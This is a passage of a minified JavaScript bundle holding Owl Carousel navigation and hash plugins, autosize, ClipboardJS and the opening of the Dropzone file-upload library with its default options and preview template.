this._core.minimum(!0)), this._controls.$next.toggleClass("disabled", !o && i >= this._core.maximum(!0))), this._controls.$absolute.toggleClass("disabled", !e.dots || n), e.dots && (t = this._pages.length - this._controls.$absolute.children().length, e.dotsData && 0 != t ? this._controls.$absolute.html(this._templates.join("")) : 0 < t ? this._controls.$absolute.append(new Array(1 + t).join(this._templates[0])) : t < 0 && this._controls.$absolute.children().slice(t).remove(), this._controls.$absolute.find(".active").removeClass("active"), this._controls.$absolute.children().eq(a.inArray(this.current(), this._pages)).addClass("active")) }, e.prototype.onTrigger = function (t) { var e = this._core.settings; t.page = { index: a.inArray(this.current(), this._pages), count: this._pages.length, size: e && (e.center || e.autoWidth || e.dotsData ? 1 : e.dotsEach || e.items) } }, e.prototype.current = function () { var n = this._core.relative(this._core.current()); return a.grep(this._pages, a.proxy(function (t, e) { return t.start <= n && t.end >= n }, this)).pop() }, e.prototype.getPosition = function (t) { var e, n, i = this._core.settings; return "page" == i.slideBy ? (e = a.inArray(this.current(), this._pages), n = this._pages.length, t ? ++e : --e, e = this._pages[(e % n + n) % n].start) : (e = this._core.relative(this._core.current()), n = this._core.items().length, t ? e += i.slideBy : e -= i.slideBy), e }, e.prototype.next = function (t) { a.proxy(this._overrides.to, this._core)(this.getPosition(!0), t) }, e.prototype.prev = function (t) { a.proxy(this._overrides.to, this._core)(this.getPosition(!1), t) }, e.prototype.to = function (t, e, n) { var i; !n && this._pages.length ? (i = this._pages.length, a.proxy(this._overrides.to, this._core)(this._pages[(t % i + i) % i].start, e)) : a.proxy(this._overrides.to, this._core)(t, e) }, a.fn.owlCarousel.Constructor.Plugins.Navigation = e }(window.Zepto || window.jQuery, (window, document)), function (i, o) { "use strict"; var e = function (t) { this._core = t, this._hashes = {}, this.$element = this._core.$element, this._handlers = { "initialized.owl.carousel": i.proxy(function (t) { t.namespace && "URLHash" === this._core.settings.startPosition && i(o).trigger("hashchange.owl.navigation") }, this), "prepared.owl.carousel": i.proxy(function (t) { if (t.namespace) { var e = i(t.content).find("[data-hash]").addBack("[data-hash]").attr("data-hash"); if (!e) return; this._hashes[e] = t.content } }, this), "changed.owl.carousel": i.proxy(function (t) { if (t.namespace && "position" === t.property.name) { var n = this._core.items(this._core.relative(this._core.current())), e = i.map(this._hashes, function (t, e) { return t === n ? e : null }).join(); if (!e || o.location.hash.slice(1) === e) return; o.location.hash = e } }, this) }, this._core.options = i.extend({}, e.Defaults, this._core.options), this.$element.on(this._handlers), i(o).on("hashchange.owl.navigation", i.proxy(function (t) { var e = o.location.hash.substring(1), n = this._core.$stage.children(), i = this._hashes[e] && n.index(this._hashes[e]); void 0 !== i && i !== this._core.current() && this._core.to(this._core.relative(i), !1, !0) }, this)) }; e.Defaults = { URLhashListener: !1 }, e.prototype.destroy = function () { var t, e; for (t in i(o).off("hashchange.owl.navigation"), this._handlers) this._core.$element.off(t, this._handlers[t]); for (e in Object.getOwnPropertyNames(this)) "function" != typeof this[e] && (this[e] = null) }, i.fn.owlCarousel.Constructor.Plugins.Hash = e }(window.Zepto || window.jQuery, window, document), function (o, a) { var s = o("<support>").get(0).style, r = "Webkit Moz O ms".split(" "), t = { transition: { end: { WebkitTransition: "webkitTransitionEnd", MozTransition: "transitionend", OTransition: "oTransitionEnd", transition: "transitionend" } }, animation: { end: { WebkitAnimation: "webkitAnimationEnd", MozAnimation: "animationend", OAnimation: "oAnimationEnd", animation: "animationend" } } }, e = function () { return !!g("transform") }, n = function () { return !!g("perspective") }, i = function () { return !!g("animation") }; function g(t, n) { var i = !1, e = t.charAt(0).toUpperCase() + t.slice(1); return o.each((t + " " + r.join(e + " ") + e).split(" "), function (t, e) { if (s[e] !== a) return i = !n || e, !1 }), i } function l(t) { return g(t, !0) } !function () { return !!g("transition") }() || (o.support.transition = new String(l("transition")), o.support.transition.end = t.transition.end[o.support.transition]), i() && (o.support.animation = new String(l("animation")), o.support.animation.end = t.animation.end[o.support.animation]), e() && (o.support.transform = new String(l("transform")), o.support.transform3d = n()) }(window.Zepto || window.jQuery, (window, void document)), function (t, e) { var n; "function" == typeof define && define.amd ? define(["module", "exports"], e) : "undefined" != typeof exports ? e(module, exports) : (e(n = { exports: {} }, n.exports), t.autosize = n.exports) }(this, function (t, e) { "use strict"; var n, i, c = "function" == typeof Map ? new Map : (n = [], i = [], { has: function (t) { return -1 < n.indexOf(t) }, get: function (t) { return i[n.indexOf(t)] }, set: function (t, e) { -1 === n.indexOf(t) && (n.push(t), i.push(e)) }, delete: function (t) { var e = n.indexOf(t); -1 < e && (n.splice(e, 1), i.splice(e, 1)) } }), I = function (t) { return new Event(t, { bubbles: !0 }) }; try { new Event("test") } catch (t) { I = function (t) { var e = document.createEvent("Event"); return e.initEvent(t, !0, !1), e } } function o(o) { var n, i, a, t, s, e; function r(t) { var e = o.style.width; o.style.width = "0px", o.offsetWidth, o.style.width = e, o.style.overflowY = t } function g() { var t, e; 0 !== o.scrollHeight && (t = function (t) { for (var e = []; t && t.parentNode && t.parentNode instanceof Element;)t.parentNode.scrollTop && e.push({ node: t.parentNode, scrollTop: t.parentNode.scrollTop }), t = t.parentNode; return e }(o), e = document.documentElement && document.documentElement.scrollTop, o.style.height = "", o.style.height = o.scrollHeight + n + "px", i = o.clientWidth, t.forEach(function (t) { t.node.scrollTop = t.scrollTop }), e && (document.documentElement.scrollTop = e)) } function l() { g(); var t = Math.round(parseFloat(o.style.height)), e = window.getComputedStyle(o, null), n = "content-box" === e.boxSizing ? Math.round(parseFloat(e.height)) : o.offsetHeight; if (n < t ? "hidden" === e.overflowY && (r("scroll"), g(), n = "content-box" === e.boxSizing ? Math.round(parseFloat(window.getComputedStyle(o, null).height)) : o.offsetHeight) : "hidden" !== e.overflowY && (r("hidden"), g(), n = "content-box" === e.boxSizing ? Math.round(parseFloat(window.getComputedStyle(o, null).height)) : o.offsetHeight), a !== n) { a = n; var i = I("autosize:resized"); try { o.dispatchEvent(i) } catch (t) { } } } o && o.nodeName && "TEXTAREA" === o.nodeName && !c.has(o) && (a = i = n = null, t = function () { o.clientWidth !== i && l() }, s = function (e) { window.removeEventListener("resize", t, !1), o.removeEventListener("input", l, !1), o.removeEventListener("keyup", l, !1), o.removeEventListener("autosize:destroy", s, !1), o.removeEventListener("autosize:update", l, !1), Object.keys(e).forEach(function (t) { o.style[t] = e[t] }), c.delete(o) }.bind(o, { height: o.style.height, resize: o.style.resize, overflowY: o.style.overflowY, overflowX: o.style.overflowX, wordWrap: o.style.wordWrap }), o.addEventListener("autosize:destroy", s, !1), "onpropertychange" in o && "oninput" in o && o.addEventListener("keyup", l, !1), window.addEventListener("resize", t, !1), o.addEventListener("input", l, !1), o.addEventListener("autosize:update", l, !1), o.style.overflowX = "hidden", o.style.wordWrap = "break-word", c.set(o, { destroy: s, update: l }), "vertical" === (e = window.getComputedStyle(o, null)).resize ? o.style.resize = "none" : "both" === e.resize && (o.style.resize = "horizontal"), n = "content-box" === e.boxSizing ? -(parseFloat(e.paddingTop) + parseFloat(e.paddingBottom)) : parseFloat(e.borderTopWidth) + parseFloat(e.borderBottomWidth), isNaN(n) && (n = 0), l()) } function a(t) { var e = c.get(t); e && e.destroy() } function s(t) { var e = c.get(t); e && e.update() } var r = null; "undefined" == typeof window || "function" != typeof window.getComputedStyle ? ((r = function (t) { return t }).destroy = function (t) { return t }, r.update = function (t) { return t }) : ((r = function (t) { return t && Array.prototype.forEach.call(t.length ? t : [t], o), t }).destroy = function (t) { return t && Array.prototype.forEach.call(t.length ? t : [t], a), t }, r.update = function (t) { return t && Array.prototype.forEach.call(t.length ? t : [t], s), t }), e.default = r, t.exports = e.default }), function (t, e) { "object" == typeof exports && "object" == typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define([], e) : "object" == typeof exports ? exports.ClipboardJS = e() : t.ClipboardJS = e() }(this, function () { return i = {}, o.m = n = [function (t, e, n) { "use strict"; var i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t }, o = function (t, e, n) { return e && g(t.prototype, e), n && g(t, n), t }, a = l(n(1)), s = l(n(3)), r = l(n(4)); function g(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } function l(t) { return t && t.__esModule ? t : { default: t } } var c = (function (t, e) { if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function, not " + typeof e); t.prototype = Object.create(e && e.prototype, { constructor: { value: t, enumerable: !1, writable: !0, configurable: !0 } }), e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e) }(I, s.default), o(I, [{ key: "resolveOptions", value: function () { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {}; this.action = "function" == typeof t.action ? t.action : this.defaultAction, this.target = "function" == typeof t.target ? t.target : this.defaultTarget, this.text = "function" == typeof t.text ? t.text : this.defaultText, this.container = "object" === i(t.container) ? t.container : document.body } }, { key: "listenClick", value: function (t) { var e = this; this.listener = (0, r.default)(t, "click", function (t) { return e.onClick(t) }) } }, { key: "onClick", value: function (t) { var e = t.delegateTarget || t.currentTarget; this.clipboardAction && (this.clipboardAction = null), this.clipboardAction = new a.default({ action: this.action(e), target: this.target(e), text: this.text(e), container: this.container, trigger: e, emitter: this }) } }, { key: "defaultAction", value: function (t) { return u("action", t) } }, { key: "defaultTarget", value: function (t) { var e = u("target", t); if (e) return document.querySelector(e) } }, { key: "defaultText", value: function (t) { return u("text", t) } }, { key: "destroy", value: function () { this.listener.destroy(), this.clipboardAction && (this.clipboardAction.destroy(), this.clipboardAction = null) } }], [{ key: "isSupported", value: function () { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : ["copy", "cut"], e = "string" == typeof t ? [t] : t, n = !!document.queryCommandSupported; return e.forEach(function (t) { n = n && !!document.queryCommandSupported(t) }), n } }]), I); function I(t, e) { !function (t) { if (!(t instanceof I)) throw new TypeError("Cannot call a class as a function") }(this); var n = function (t, e) { if (!t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !e || "object" != typeof e && "function" != typeof e ? t : e }(this, (I.__proto__ || Object.getPrototypeOf(I)).call(this)); return n.resolveOptions(e), n.listenClick(t), n } function u(t, e) { var n = "data-clipboard-" + t; if (e.hasAttribute(n)) return e.getAttribute(n) } t.exports = c }, function (t, e, n) { "use strict"; var i = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) { return typeof t } : function (t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t }, o = function (t, e, n) { return e && r(t.prototype, e), n && r(t, n), t }, a = n(2), s = a && a.__esModule ? a : { default: a }; function r(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } var g = (o(l, [{ key: "resolveOptions", value: function () { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {}; this.action = t.action, this.container = t.container, this.emitter = t.emitter, this.target = t.target, this.text = t.text, this.trigger = t.trigger, this.selectedText = "" } }, { key: "initSelection", value: function () { this.text ? this.selectFake() : this.target && this.selectTarget() } }, { key: "selectFake", value: function () { var t = this, e = "rtl" == document.documentElement.getAttribute("dir"); this.removeFake(), this.fakeHandlerCallback = function () { return t.removeFake() }, this.fakeHandler = this.container.addEventListener("click", this.fakeHandlerCallback) || !0, this.fakeElem = document.createElement("textarea"), this.fakeElem.style.fontSize = "12pt", this.fakeElem.style.border = "0", this.fakeElem.style.padding = "0", this.fakeElem.style.margin = "0", this.fakeElem.style.position = "absolute", this.fakeElem.style[e ? "right" : "left"] = "-9999px"; var n = window.pageYOffset || document.documentElement.scrollTop; this.fakeElem.style.top = n + "px", this.fakeElem.setAttribute("readonly", ""), this.fakeElem.value = this.text, this.container.appendChild(this.fakeElem), this.selectedText = (0, s.default)(this.fakeElem), this.copyText() } }, { key: "removeFake", value: function () { this.fakeHandler && (this.container.removeEventListener("click", this.fakeHandlerCallback), this.fakeHandler = null, this.fakeHandlerCallback = null), this.fakeElem && (this.container.removeChild(this.fakeElem), this.fakeElem = null) } }, { key: "selectTarget", value: function () { this.selectedText = (0, s.default)(this.target), this.copyText() } }, { key: "copyText", value: function () { var e = void 0; try { e = document.execCommand(this.action) } catch (t) { e = !1 } this.handleResult(e) } }, { key: "handleResult", value: function (t) { this.emitter.emit(t ? "success" : "error", { action: this.action, text: this.selectedText, trigger: this.trigger, clearSelection: this.clearSelection.bind(this) }) } }, { key: "clearSelection", value: function () { this.trigger && this.trigger.focus(), window.getSelection().removeAllRanges() } }, { key: "destroy", value: function () { this.removeFake() } }, { key: "action", set: function () { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : "copy"; if (this._action = t, "copy" !== this._action && "cut" !== this._action) throw new Error('Invalid "action" value, use either "copy" or "cut"') }, get: function () { return this._action } }, { key: "target", set: function (t) { if (void 0 !== t) { if (!t || "object" !== (void 0 === t ? "undefined" : i(t)) || 1 !== t.nodeType) throw new Error('Invalid "target" value, use a valid Element'); if ("copy" === this.action && t.hasAttribute("disabled")) throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute'); if ("cut" === this.action && (t.hasAttribute("readonly") || t.hasAttribute("disabled"))) throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes'); this._target = t } }, get: function () { return this._target } }]), l); function l(t) { !function (t) { if (!(t instanceof l)) throw new TypeError("Cannot call a class as a function") }(this), this.resolveOptions(t), this.initSelection() } t.exports = g }, function (t, e) { t.exports = function (t) { var e, n, i, o = "SELECT" === t.nodeName ? (t.focus(), t.value) : "INPUT" === t.nodeName || "TEXTAREA" === t.nodeName ? ((e = t.hasAttribute("readonly")) || t.setAttribute("readonly", ""), t.select(), t.setSelectionRange(0, t.value.length), e || t.removeAttribute("readonly"), t.value) : (t.hasAttribute("contenteditable") && t.focus(), n = window.getSelection(), (i = document.createRange()).selectNodeContents(t), n.removeAllRanges(), n.addRange(i), n.toString()); return o } }, function (t, e) { function n() { } n.prototype = { on: function (t, e, n) { var i = this.e || (this.e = {}); return (i[t] || (i[t] = [])).push({ fn: e, ctx: n }), this }, once: function (t, e, n) { var i = this; function o() { i.off(t, o), e.apply(n, arguments) } return o._ = e, this.on(t, o, n) }, emit: function (t) { for (var e = [].slice.call(arguments, 1), n = ((this.e || (this.e = {}))[t] || []).slice(), i = 0, o = n.length; i < o; i++)n[i].fn.apply(n[i].ctx, e); return this }, off: function (t, e) { var n = this.e || (this.e = {}), i = n[t], o = []; if (i && e) for (var a = 0, s = i.length; a < s; a++)i[a].fn !== e && i[a].fn._ !== e && o.push(i[a]); return o.length ? n[t] = o : delete n[t], this } }, t.exports = n }, function (t, e, n) { var l = n(5), c = n(6); t.exports = function (t, e, n) { if (!t && !e && !n) throw new Error("Missing required arguments"); if (!l.string(e)) throw new TypeError("Second argument must be a String"); if (!l.fn(n)) throw new TypeError("Third argument must be a Function"); if (l.node(t)) return r = e, g = n, (s = t).addEventListener(r, g), { destroy: function () { s.removeEventListener(r, g) } }; if (l.nodeList(t)) return i = t, o = e, a = n, Array.prototype.forEach.call(i, function (t) { t.addEventListener(o, a) }), { destroy: function () { Array.prototype.forEach.call(i, function (t) { t.removeEventListener(o, a) }) } }; if (l.string(t)) return c(document.body, t, e, n); throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList"); var i, o, a, s, r, g } }, function (t, n) { n.node = function (t) { return void 0 !== t && t instanceof HTMLElement && 1 === t.nodeType }, n.nodeList = function (t) { var e = Object.prototype.toString.call(t); return void 0 !== t && ("[object NodeList]" === e || "[object HTMLCollection]" === e) && "length" in t && (0 === t.length || n.node(t[0])) }, n.string = function (t) { return "string" == typeof t || t instanceof String }, n.fn = function (t) { return "[object Function]" === Object.prototype.toString.call(t) } }, function (t, e, n) { var s = n(7); function a(t, e, n, i, o) { var a = function (e, n, t, i) { return function (t) { t.delegateTarget = s(t.target, n), t.delegateTarget && i.call(e, t) } }.apply(this, arguments); return t.addEventListener(n, a, o), { destroy: function () { t.removeEventListener(n, a, o) } } } t.exports = function (t, e, n, i, o) { return "function" == typeof t.addEventListener ? a.apply(null, arguments) : "function" == typeof n ? a.bind(null, document).apply(null, arguments) : ("string" == typeof t && (t = document.querySelectorAll(t)), Array.prototype.map.call(t, function (t) { return a(t, e, n, i, o) })) } }, function (t, e) { var n; "undefined" == typeof Element || Element.prototype.matches || ((n = Element.prototype).matches = n.matchesSelector || n.mozMatchesSelector || n.msMatchesSelector || n.oMatchesSelector || n.webkitMatchesSelector), t.exports = function (t, e) { for (; t && 9 !== t.nodeType;) { if ("function" == typeof t.matches && t.matches(e)) return t; t = t.parentNode } } }], o.c = i, o.d = function (t, e, n) { o.o(t, e) || Object.defineProperty(t, e, { enumerable: !0, get: n }) }, o.r = function (t) { "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(t, "__esModule", { value: !0 }) }, o.t = function (e, t) { if (1 & t && (e = o(e)), 8 & t) return e; if (4 & t && "object" == typeof e && e && e.__esModule) return e; var n = Object.create(null); if (o.r(n), Object.defineProperty(n, "default", { enumerable: !0, value: e }), 2 & t && "string" != typeof e) for (var i in e) o.d(n, i, function (t) { return e[t] }.bind(null, i)); return n }, o.n = function (t) { var e = t && t.__esModule ? function () { return t.default } : function () { return t }; return o.d(e, "a", e), e }, o.o = function (t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, o.p = "", o(o.s = 0); function o(t) { if (i[t]) return i[t].exports; var e = i[t] = { i: t, l: !1, exports: {} }; return n[t].call(e.exports, e, e.exports, o), e.l = !0, e.exports } var n, i }); var _createClass = function () { function i(t, e) { for (var n = 0; n < e.length; n++) { var i = e[n]; i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(t, i.key, i) } } return function (t, e, n) { return e && i(t.prototype, e), n && i(t, n), t } }(); function _possibleConstructorReturn(t, e) { if (!t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !e || "object" != typeof e && "function" != typeof e ? t : e } function _inherits(t, e) { if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function, not " + typeof e); t.prototype = Object.create(e && e.prototype, { constructor: { value: t, enumerable: !1, writable: !0, configurable: !0 } }), e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e) } function _classCallCheck(t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") } var Emitter = function () { function t() { _classCallCheck(this, t) } return _createClass(t, [{ key: "on", value: function (t, e) { return this._callbacks = this._callbacks || {}, this._callbacks[t] || (this._callbacks[t] = []), this._callbacks[t].push(e), this } }, { key: "emit", value: function (t) { this._callbacks = this._callbacks || {}; var e = this._callbacks[t]; if (e) { for (var n = arguments.length, i = Array(1 < n ? n - 1 : 0), o = 1; o < n; o++)i[o - 1] = arguments[o]; for (var a = 0, s = s = e; ;) { if (1, a >= s.length) break; s[a++].apply(this, i) } } return this } }, { key: "off", value: function (t, e) { if (!this._callbacks || 0 === arguments.length) return this._callbacks = {}, this; var n = this._callbacks[t]; if (!n) return this; if (1 === arguments.length) return delete this._callbacks[t], this; for (var i = 0; i < n.length; i++) { if (n[i] === e) { n.splice(i, 1); break } } return this } }]), t }(), Dropzone = function () { function b(t, e) { _classCallCheck(this, b); var n, i = _possibleConstructorReturn(this, (b.__proto__ || Object.getPrototypeOf(b)).call(this)), o = void 0; if (i.element = t, i.version = b.version, i.defaultOptions.previewTemplate = i.defaultOptions.previewTemplate.replace(/\n*/g, ""), i.clickableElements = [], i.listeners = [], i.files = [], "string" == typeof i.element && (i.element = document.querySelector(i.element)), !i.element || null == i.element.nodeType) throw new Error("Invalid dropzone element."); if (i.element.dropzone) throw new Error("Dropzone already attached."); b.instances.push(i), i.element.dropzone = i; var a = null != (n = b.optionsForElement(i.element)) ? n : {}; if (i.options = b.extend({}, i.defaultOptions, a, null != e ? e : {}), i.options.forceFallback || !b.isBrowserSupported()) { var s = i.options.fallback.call(i); return _possibleConstructorReturn(i, s) } if (null == i.options.url && (i.options.url = i.element.getAttribute("action")), !i.options.url) throw new Error("No URL provided."); if (i.options.acceptedFiles && i.options.acceptedMimeTypes) throw new Error("You can't provide both 'acceptedFiles' and 'acceptedMimeTypes'. 'acceptedMimeTypes' is deprecated."); if (i.options.uploadMultiple && i.options.chunking) throw new Error("You cannot set both: uploadMultiple and chunking."); return i.options.acceptedMimeTypes && (i.options.acceptedFiles = i.options.acceptedMimeTypes, delete i.options.acceptedMimeTypes), null != i.options.renameFilename && (i.options.renameFile = function (t) { return i.options.renameFilename.call(i, t.name, t) }), i.options.method = i.options.method.toUpperCase(), (o = i.getExistingFallback()) && o.parentNode && o.parentNode.removeChild(o), !1 !== i.options.previewsContainer && (i.options.previewsContainer ? i.previewsContainer = b.getElement(i.options.previewsContainer, "previewsContainer") : i.previewsContainer = i.element), i.options.clickable && (!0 === i.options.clickable ? i.clickableElements = [i.element] : i.clickableElements = b.getElements(i.options.clickable, "clickable")), i.init(), i } return _inherits(b, Emitter), _createClass(b, null, [{ key: "initClass", value: function () { this.prototype.Emitter = Emitter, this.prototype.events = ["drop", "dragstart", "dragend", "dragenter", "dragover", "dragleave", "addedfile", "addedfiles", "removedfile", "thumbnail", "error", "errormultiple", "processing", "processingmultiple", "uploadprogress", "totaluploadprogress", "sending", "sendingmultiple", "success", "successmultiple", "canceled", "canceledmultiple", "complete", "completemultiple", "reset", "maxfilesexceeded", "maxfilesreached", "queuecomplete"], this.prototype.defaultOptions = { url: null, method: "post", withCredentials: !1, timeout: 3e4, parallelUploads: 2, uploadMultiple: !1, chunking: !1, forceChunking: !1, chunkSize: 2e6, parallelChunkUploads: !1, retryChunks: !1, retryChunksLimit: 3, maxFilesize: 256, paramName: "file", createImageThumbnails: !0, maxThumbnailFilesize: 10, thumbnailWidth: 120, thumbnailHeight: 120, thumbnailMethod: "crop", resizeWidth: null, resizeHeight: null, resizeMimeType: null, resizeQuality: .8, resizeMethod: "contain", filesizeBase: 1e3, maxFiles: null, headers: null, clickable: !0, ignoreHiddenFiles: !0, acceptedFiles: null, acceptedMimeTypes: null, autoProcessQueue: !0, autoQueue: !0, addRemoveLinks: !1, previewsContainer: null, hiddenInputContainer: "body", capture: null, renameFilename: null, renameFile: null, forceFallback: !1, dictDefaultMessage: "Drop files here to upload", dictFallbackMessage: "Your browser does not support drag'n'drop file uploads.", dictFallbackText: "Please use the fallback form below to upload your files like in the olden days.", dictFileTooBig: "File is too big ({{filesize}}MiB). Max filesize: {{maxFilesize}}MiB.", dictInvalidFileType: "You can't upload files of this type.", dictResponseError: "Server responded with {{statusCode}} code.", dictCancelUpload: "Cancel upload", dictUploadCanceled: "Upload canceled.", dictCancelUploadConfirmation: "Are you sure you want to cancel this upload?", dictRemoveFile: "Remove file", dictRemoveFileConfirmation: null, dictMaxFilesExceeded: "You can not upload any more files.", dictFileSizeUnits: { tb: "TB", gb: "GB", mb: "MB", kb: "KB", b: "b" }, init: function () { }, params: function (t, e, n) { if (n) return { dzuuid: n.file.upload.uuid, dzchunkindex: n.index, dztotalfilesize: n.file.size, dzchunksize: this.options.chunkSize, dztotalchunkcount: n.file.upload.totalChunkCount, dzchunkbyteoffset: n.index * this.options.chunkSize } }, accept: function (t, e) { return e() }, chunksUploaded: function (t, e) { e() }, fallback: function () { var t = void 0; this.element.className = this.element.className + " dz-browser-not-supported"; for (var e = 0, n = n = this.element.getElementsByTagName("div"); ;) { if (1, e >= n.length) break; var i = n[e++]; if (/(^| )dz-message($| )/.test(i.className)) { (t = i).className = "dz-message"; break } } t || (t = b.createElement('<div class="dz-message"><span></span></div>'), this.element.appendChild(t)); var o = t.getElementsByTagName("span")[0]; return o && (null != o.textContent ? o.textContent = this.options.dictFallbackMessage : null != o.innerText && (o.innerText = this.options.dictFallbackMessage)), this.element.appendChild(this.getFallbackForm()) }, resize: function (t, e, n, i) { var o = { srcX: 0, srcY: 0, srcWidth: t.width, srcHeight: t.height }, a = t.width / t.height; null == e && null == n ? (e = o.srcWidth, n = o.srcHeight) : null == e ? e = n * a : null == n && (n = e / a); var s = (e = Math.min(e, o.srcWidth)) / (n = Math.min(n, o.srcHeight)); if (o.srcWidth > e || o.srcHeight > n) if ("crop" === i) s < a ? (o.srcHeight = t.height, o.srcWidth = o.srcHeight * s) : (o.srcWidth = t.width, o.srcHeight = o.srcWidth / s); else { if ("contain" !== i) throw new Error("Unknown resizeMethod '" + i + "'"); s < a ? n = e / a : e = n * a } return o.srcX = (t.width - o.srcWidth) / 2, o.srcY = (t.height - o.srcHeight) / 2, o.trgWidth = e, o.trgHeight = n, o }, transformFile: function (t, e) { return (this.options.resizeWidth || this.options.resizeHeight) && t.type.match(/image.*/) ? this.resizeImage(t, this.options.resizeWidth, this.options.resizeHeight, this.options.resizeMethod, e) : e(t) }, previewTemplate: '<div class="dz-preview dz-file-preview">\n  <div class="dz-image"><img data-dz-thumbnail /></div>\n  <div class="dz-details">\n    <div class="dz-size"><span data-dz-size></span></div>\n    <div class="dz-filename"><span data-dz-name></span></div>\n  </div>\n  <div class="dz-progress"><span class="dz-upload" data-dz-uploadprogress></span></div>\n  <div class="dz-error-message"><span data-dz-errormessage></span></div>\n  <div class="dz-success-mark">\n    <svg width="54px" height="54px" viewBox="0 0 54 54" version="1.1" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink" xmlns:sketch="https://www.bohemiancoding.com/sketch/ns">\n      <title>Check</title>\n      <defs></defs>\n      <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" sketch:type="MSPage">\n        <path d="M23.5,31.8431458 L17.5852419,25.9283877 C16.0248253,24.3679711 13.4910294,24.366835 11.9289322,25.9289322 C10.3700136,27.4878508 10.3665912,30.0234455 11.9283877,31.5852419 L20.4147581,40.0716123 C20.5133999,40.1702541 20.6159315,40.2626649 20.7218615,40.3488435 C22.2835669,41.8725651 24.794234,41.8626202 26.3461564,40.3106978 L43.3106978,23.3461564 C44.8771021,21.7797521 44.8758057,19.2483887 43.3137085,17.6862915 C41.7547899,16.1273729 39.2176035,16.1255422 37.6538436,17.6893022 L23.5,31.8431458 Z M27,53 C41.3594035,53 53,41.3594035 53,27 C53,12.6405965 41.3594035,1 27,1 C12.6405965,1 1,12.6405965 1,27 C1,41.3594035 12.6405965,53 27,53 Z" id="Oval-2" stroke-opacity="0.198794158" stroke="#747474" fill-opacity="0.816519475" fill="#FFFFFF" sketch:type="MSShapeGroup"></path>\n      </g>\n    </svg>\n  </div>\n  <div class="dz-error-mark">\n    <svg width="54px" height="54px" viewBox="0 0 54 54" version="1.1" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink" xmlns:sketch="https://www.bohemiancoding.com/sketch/ns">\n      <title>Error</title>\n      <defs></defs>\n      <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" sketch:type="MSPage">\n        <g id="Check-+-Oval-2" sketch:type="MSLayerGroup" stroke="#747474" stroke-opacity="0.198794158" fill="#FFFFFF" fill-opacity="0.816519475">\n          <path d="M32.6568542,29 L38.3106978,23.3461564 C39.8771021,21.7797521 39.8758057,19.2483887 38.3137085,17.6862915 C36.7547899,16.1273729 34.2176035,16.1255422 32.6538436,17.6893022 L27,23.3431458 L21.3461564,17.6893022 C19.7823965,16.1255422 17.2452101,16.1273729 15.6862915,17.6862915 C14.1241943,19.2483887 14.1228979,21.7797521 15.6893022,23.3461564 L21.3431458,29 L15.6893022,34.6538436 C14.1228979,36.2202479 14.1241943,38.7516113 15.6862915,40.3137085 C17.2452101,41.8726271 19.7823965,41.8744578 21.3461564,40.3106978 L27,34.6568542 L32.6538436,40.3106978 C34.2176035,41.8744578 36.7547899,41.8726271 38.3137085,40.3137085 C39.8758057,38.7516113 39.8771021,36.2202479 38.3106978,34.6538436 L32.6568542,29 Z M27,53 C41.3594035,53 53,41.3594035 53,27 C53,12.6405965 41.3594035,1 27,1 C12.6405965,1 1,12.6405965 1,27 C1,41.3594035 12.6405965,53 27,53 Z" id="Oval-2" sketch:type="MSShapeGroup"></path>\n        </g>\n      </g>\n    </svg>\n  </div>\n</div>', drop: function () { return this.element.classList.remove("dz-drag-hover") }, dragstart: function () { }, dragend: function () { return this.element.classList.remove("dz-drag-hover") }, dragenter: function () { return this.element.classList.add("dz-drag-hover") }, dragover: function () { return this.element.classList.add("dz-drag-hover") }, dragleave: function () { return this.element.classList.remove("dz-drag-hover") }, paste: function () { }, reset: function () { return this.element.classList.remove("dz-started") }, addedfile: function (e) { var n = this; if (this.element === this.previewsContainer && this.element.classList.add("dz-started"), this.previewsContainer) { e.previewElement = b.createElement(this.options.previewTemplate.trim()), e.previewTemplate = e.previewElement, this.previewsContainer.appendChild(e.previewElement); for (var t = 0, i = i = e.previewElement.querySelectorAll("[data-dz-name]"); ;) { if (1, t >= i.length) break; var o = i[t++]; o.textContent = e.name } for (var a = 0, s = s = e.previewElement.querySelectorAll("[data-dz-size]"); 1, !(a >= s.length);)(o = s[a++]).innerHTML = this.filesize(e.size); this.options.addRemoveLinks && (e._removeLink = b.createElement('<a class="dz-remove" href="javascript:undefined;" data-dz-remove>' + this.options.dictRemoveFile + "</a>"), e.previewElement.appendChild(e._removeLink)); function r(t) { return t.preventDefault(), t.stopPropagation(), e.status === b.UPLOADING ? 